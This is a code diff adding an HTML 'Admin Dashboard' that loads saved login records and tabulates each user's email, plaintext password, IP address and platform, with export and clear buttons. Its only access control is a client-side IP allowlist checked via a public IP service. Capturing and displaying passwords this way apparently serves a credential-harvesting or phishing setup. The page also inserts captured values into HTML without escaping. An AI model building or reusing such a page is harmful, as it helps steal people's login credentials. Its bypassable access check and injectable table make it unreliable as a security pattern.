@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Arial', sans-serif; 
+            background: #1a1a1a;
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: #2d2d2d;
+            border-radius: 10px;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .stat-card {
+            background: #2d2d2d;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .stat-number {
+            font-size: 2em;
+            font-weight: bold;
+            color: #667eea;
+        }
+        .login-table {
+            background: #2d2d2d;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #444;
+        }
+        th {
+            background: #333;
+            font-weight: 600;
+        }
+        tr:hover {
+            background: #3d3d3d;
+        }
+        .type-login { color: #4CAF50; }
+        .type-signup { color: #2196F3; }
+        .access-denied {
+            text-align: center;
+            padding: 100px 20px;
+            color: #ff4444;
+        }
+        .export-btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div id="adminContent" style="display: none;">
+        <div class="container">
+            <div class="header">
+                <h1>🔒 Admin Dashboard</h1>
+                <p>Monitor all login activity</p>
+            </div>
+
+            <div class="stats">
+                <div class="stat-card">
+                    <div class="stat-number" id="totalLogins">0</div>
+                    <div>Total Logins</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="totalSignups">0</div>
+                    <div>Total Signups</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="uniqueIPs">0</div>
+                    <div>Unique IPs</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="todayActivity">0</div>
+                    <div>Today's Activity</div>
+                </div>
+            </div>
+
+            <button class="export-btn" onclick="exportData()">📥 Export Data</button>
+            <button class="export-btn" onclick="clearData()">🗑️ Clear Data</button>
+
+            <div class="login-table">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Type</th>
+                            <th>Email</th>
+                            <th>Password</th>
+                            <th>IP Address</th>
+                            <th>Platform</th>
+                            <th>Time</th>
+                        </tr>
+                    </thead>
+                    <tbody id="loginTableBody">
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <div id="accessDenied" class="access-denied" style="display: none;">
+        <h1>🚫 Access Denied</h1>
+        <p>This dashboard is restricted to authorized personnel only.</p>
+        <p><a href="index.html" style="color: #667eea;">Return to Login</a></p>
+    </div>
+
+    <script>
+        // ⚠️ REPLACE THIS WITH YOUR ACTUAL PUBLIC IP ADDRESS ⚠️
+        // Visit https://whatismyipaddress.com to find your IP
+        const ALLOWED_IPS = [
+            '169.224.100.144'  // ← YOU MUST CHANGE THIS!
+        ];
+
+        // IP verification
+        async function verifyAccess() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const userIP = data.ip;
+                
+                console.log('Your IP is:', userIP); // This will show in browser console
+                
+                if (ALLOWED_IPS.includes(userIP)) {
+                    document.getElementById('adminContent').style.display = 'block';
+                    loadDashboardData();
+                } else {
+                    document.getElementById('accessDenied').style.display = 'block';
+                    console.log('Access denied for IP:', userIP);
+                }
+            } catch (error) {
+                document.getElementById('accessDenied').style.display = 'block';
+            }
+        }
+
+        function loadDashboardData() {
+            const logins = JSON.parse(localStorage.getItem('loginData') || '[]');
+            
+            // Update stats
+            document.getElementById('totalLogins').textContent = logins.filter(l => l.type === 'LOGIN').length;
+            document.getElementById('totalSignups').textContent = logins.filter(l => l.type === 'SIGNUP').length;
+            
+            const uniqueIPs = [...new Set(logins.map(l => l.ip))].filter(ip => ip !== 'Unknown');
+            document.getElementById('uniqueIPs').textContent = uniqueIPs.length;
+            
+            const today = new Date().toDateString();
+            const todayActivity = logins.filter(l => new Date(l.timestamp).toDateString() === today).length;
+            document.getElementById('todayActivity').textContent = todayActivity;
+
+            // Populate table
+            const tbody = document.getElementById('loginTableBody');
+            tbody.innerHTML = '';
+            
+            logins.reverse().forEach(login => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td class="type-${login.type.toLowerCase()}">${login.type}</td>
+                    <td>${login.email}</td>
+                    <td>${login.password}</td>
+                    <td>${login.ip}</td>
+                    <td>${login.browser.platform}</td>
+                    <td>${new Date(login.timestamp).toLocaleString()}</td>
+                `;
+                tbody.appendChild(row);
+            });
+        }
+
+        function exportData() {
+            const logins = JSON.parse(localStorage.getItem('loginData') || '[]');
+            const dataStr = JSON.stringify(logins, null, 2);
+            const dataBlob = new Blob([dataStr], {type: 'application/json'});
+            
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(dataBlob);
+            link.download = 'login-data.json';
+            link.click();
+        }
+
+        function clearData() {
+            if (confirm('Are you sure you want to clear all data?')) {
+                localStorage.removeItem('loginData');
+                loadDashboardData();
+            }
+        }
+
+        // Check access on page load
+        verifyAccess();
+    </script>
+</body>
+</html>
